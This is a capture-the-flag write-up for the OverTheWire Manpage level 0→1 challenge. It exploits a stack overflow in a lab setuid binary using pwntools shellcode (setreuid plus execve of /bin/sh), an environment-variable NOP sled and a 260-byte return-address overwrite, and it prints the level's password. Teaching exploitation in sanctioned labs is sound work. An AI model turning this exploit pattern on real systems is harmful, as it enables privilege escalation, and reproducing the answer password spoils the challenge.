# Manpage Level 0 → 1

## Goal

`manpage0` reads user input into a fixed-size stack buffer without bounds checking — a classic stack overflow. Overflow it, overwrite the saved return address with the address of shellcode you've planted in an environment variable, and when the function returns you get a shell as `manpage1`.

## Concepts you'll learn

- Using `pwntools` in Python for concise exploit construction
- Writing shellcode that does `setreuid` + `execve("/bin/sh")` — two syscalls so the spawned shell keeps elevated privileges
- The env-var + return-address pattern, identical in spirit to [Narnia 2 → 3](../narnia/level02.md)

## Walkthrough

### 1. Log in and find the binary

```bash
$ ssh manpage0@manpage.labs.overthewire.org -p 2224
$ cd /manpage
$ ls -l manpage0
-r-sr-x--- 1 manpage1 manpage0 ... manpage0
```

Setuid `manpage1`, so if we hijack execution we get a `manpage1` shell.

### 2. Generate shellcode

A standard 51-byte x86 Linux payload that does `setreuid(euid, euid); execve("/bin//sh", NULL, NULL);`:

```python
# shellcode.py
from pwn import *
context(arch='i386', os='linux')
sc = shellcraft.setreuid() + shellcraft.execve("/bin//sh")
payload = asm(sc)
print("len:", len(payload))
with open("sc.bin", "wb") as f:
    f.write(b"\x90"*50 + payload)   # 50-byte NOP sled + shellcode
```

### 3. Plant it in an env var and find its address

```bash
$ export EGG=$(cat sc.bin)
$ /tmp/getenv EGG /manpage/manpage0
EGG = 0xffffd547
```

(See [Behemoth 1](../behemoth/level01.md) for the `getenv` helper.)

### 4. Figure out the overflow offset

Use a `pwntools` cyclic pattern:

```bash
$ gdb -q /manpage/manpage0
(gdb) r < <(python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(400))')
# crash
(gdb) i r eip
(gdb) q
$ python3 -c "from pwn import *; print(cyclic_find(0x<your EIP bytes as u32>))"
```

avishai's solve lands the offset at **260** bytes to the saved EIP.

### 5. Fire the exploit

```python
# exploit.py
from pwn import *
SHELLCODE_ADDR = 0xffffd547  # whatever /tmp/getenv returned — middle of your NOP sled
sys.stdout.buffer.write(b"A"*260 + p32(SHELLCODE_ADDR))
```

Run:

```bash
$ (python3 exploit.py; cat) | /manpage/manpage0
$ whoami
manpage1
$ cat /etc/manpage_pass/manpage1
oiRJLfkGyb
```

The trailing `cat` keeps stdin open so `/bin/sh` doesn't read EOF and die.

## The answer

The password for `manpage1` is:

**`oiRJLfkGyb`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/manpage/manpage0.html>
